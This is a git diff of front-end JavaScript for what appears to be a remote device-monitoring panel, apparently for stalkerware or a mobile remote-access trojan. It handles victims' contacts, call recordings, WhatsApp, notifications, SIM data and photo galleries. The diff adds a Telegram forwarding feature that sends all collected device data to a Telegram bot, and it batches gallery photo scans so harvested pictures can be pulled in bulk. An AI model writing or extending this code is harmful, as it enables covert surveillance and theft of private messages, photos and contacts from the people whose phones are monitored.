@@ -126,7 +126,8 @@ function updateDeviceSelects() {
                  'historyDeviceSelect', 'notificationsDeviceSelect', 'contactsDeviceSelect',
                  'recordingsDeviceSelect', 'whatsappDeviceSelect',
                  'infoDeviceSelect', 'emergencyDeviceSelect',
-                 'remoteActionsDeviceSelect', 'appsDeviceSelect', 'simDeviceSelect'];
+                 'remoteActionsDeviceSelect', 'appsDeviceSelect', 'simDeviceSelect',
+                 'telegramDeviceSelect'];
 
   selects.forEach(function(selId) {
     var sel = document.getElementById(selId);
@@ -391,6 +392,10 @@ function downloadFile(filePath) {
 
 socket.on('files:list', function(data) {
   var list = document.getElementById('fileList');
+  if (data.error) {
+    list.innerHTML = '<div class="empty-state" style="padding:30px"><p style="color:var(--danger)">' + escapeHtml(data.error) + '</p></div>';
+    return;
+  }
   if (!data.files || data.files.length === 0) {
     list.innerHTML = '<div class="empty-state" style="padding:30px"><p>This folder is empty</p></div>';
     return;
@@ -487,6 +492,9 @@ function onGalleryDeviceChange() {
 function scanGallery() {
   var deviceId = getSelectedGalleryDevice();
   if (!deviceId) { showToast('Please select a device first', 'error'); return; }
+  galleryPhotos = [];
+  galleryCategories = {};
+  updateGalleryGrid();
   socket.emit('command:gallery:scan', { deviceId: deviceId });
   showToast('Scanning for photos...', 'info');
   document.getElementById('galleryCount').textContent = 'Scanning...';
@@ -529,7 +537,18 @@ function scanGalleryFromPicker() {
 
 socket.on('gallery:photos', function(data) {
   if (data.photos && data.photos.length > 0) {
-    galleryPhotos = data.photos;
+    if (data.partial) {
+      // Append batch to existing photos
+      for (var i = 0; i < data.photos.length; i++) {
+        galleryPhotos.push(data.photos[i]);
+      }
+    } else {
+      // Final complete result - use as-is if we haven't accumulated any yet
+      if (galleryPhotos.length === 0) {
+        galleryPhotos = data.photos;
+      }
+      // If we already accumulated via partial batches, keep what we have
+    }
     if (data.categories) {
       galleryCategories = data.categories;
       updateCategoryFilters();
@@ -537,23 +556,25 @@ socket.on('gallery:photos', function(data) {
     updateGalleryGrid();
     var countText = galleryPhotos.length + ' photos';
     if (data.partial && data.total) {
-      countText += ' (loading... ' + data.total + ' total)';
+      countText = galleryPhotos.length + ' / ' + data.total + ' photos (loading...)';
     } else if (data.total) {
-      countText = galleryPhotos.length + ' / ' + data.total + ' photos loaded';
+      countText = galleryPhotos.length + ' photos loaded';
     }
     document.getElementById('galleryCount').textContent = countText;
     if (!data.partial) {
-      showToast(galleryPhotos.length + ' photos found!', 'success');
+      showToast(galleryPhotos.length + ' photos loaded!', 'success');
     }
   } else if (data.useFilePicker) {
     showToast('Use "Pick from Device" button instead', 'info');
     document.getElementById('galleryCount').textContent = '';
-  } else {
+  } else if (!data.partial) {
     galleryPhotos = [];
     galleryCategories = {};
     updateGalleryGrid();
     document.getElementById('galleryCount').textContent = 'No photos found';
-    document.getElementById('galleryCategoryFilters').style.display = 'none';
+    if (document.getElementById('galleryCategoryFilters')) {
+      document.getElementById('galleryCategoryFilters').style.display = 'none';
+    }
     showToast(data.note || 'No photos found', 'info');
   }
 });
@@ -1601,12 +1622,6 @@ function filterApps() {
   document.getElementById('appsCount').textContent = filtered.length + ' of ' + allApps.length + ' apps';
 }
 
-function escapeHtml(text) {
-  var div = document.createElement('div');
-  div.textContent = text || '';
-  return div.innerHTML;
-}
-
 // ============ SIM INFO ============
 
 function fetchSimInfo() {
@@ -1655,6 +1670,48 @@ function simInfoRow(label, value) {
     '<span style="color:var(--text-secondary);font-size:13px">' + label + '</span>' +
     '<span style="font-size:14px;font-weight:500">' + (value || '-') + '</span></div>';
 }
+
+// ============ TELEGRAM BOT ============
+
+var telegramActive = true;
+
+function toggleTelegram() {
+  telegramActive = !telegramActive;
+  socket.emit('command:telegram:toggle', { enabled: telegramActive });
+  updateTelegramUI();
+  showToast('Telegram ' + (telegramActive ? 'enabled' : 'disabled'), telegramActive ? 'success' : 'info');
+}
+
+function testTelegram() {
+  socket.emit('command:telegram:test');
+  showToast('Test message sent to Telegram!', 'success');
+}
+
+function sendAllToTelegram() {
+  var deviceId = document.getElementById('telegramDeviceSelect').value;
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  socket.emit('command:telegram:sendall', { deviceId: deviceId });
+  showToast('Sending all data to Telegram...', 'success');
+}
+
+function updateTelegramUI() {
+  var status = document.getElementById('telegramStatus');
+  var btn = document.getElementById('telegramToggleBtn');
+  if (telegramActive) {
+    status.style.background = 'var(--success)';
+    status.innerHTML = '✅ Active - All data is being forwarded';
+    btn.textContent = 'Disable';
+  } else {
+    status.style.background = 'var(--danger)';
+    status.innerHTML = '❌ Disabled - Data is NOT being forwarded';
+    btn.textContent = 'Enable';
+  }
+}
+
+socket.on('telegram:status', function(data) {
+  telegramActive = data.enabled;
+  updateTelegramUI();
+});
 
 // ---- Socket Events ----
 socket.on('devices:updated', fetchDevices);
